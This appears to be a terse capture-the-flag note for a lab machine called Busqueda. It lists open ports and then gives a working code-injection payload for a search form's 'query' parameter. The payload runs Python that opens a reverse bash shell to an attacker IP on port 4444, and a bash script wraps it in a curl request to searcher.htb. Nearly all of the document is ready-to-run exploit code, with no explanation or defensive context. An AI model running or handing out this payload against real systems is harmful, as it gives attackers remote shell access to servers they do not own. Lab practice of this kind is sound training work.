# Busqueda.md  

## Nmap  

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
```  

POST data for shell.  

```
engine=Google&query='),exec('import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.140",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())')#
```

Bash exploit.  

```bash
#!/bin/bash

PAYLOAD=""
PAYLOAD+="engine=Google&query='),exec('import socket,subprocess;"
PAYLOAD+="s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
PAYLOAD+="s.connect(("
PAYLOAD+="\"$1\""
PAYLOAD+=",4444));"
PAYLOAD+="subprocess.call([\"/bin/bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())')#"

curl "http://searcher.htb/search" -d "$PAYLOAD"
```
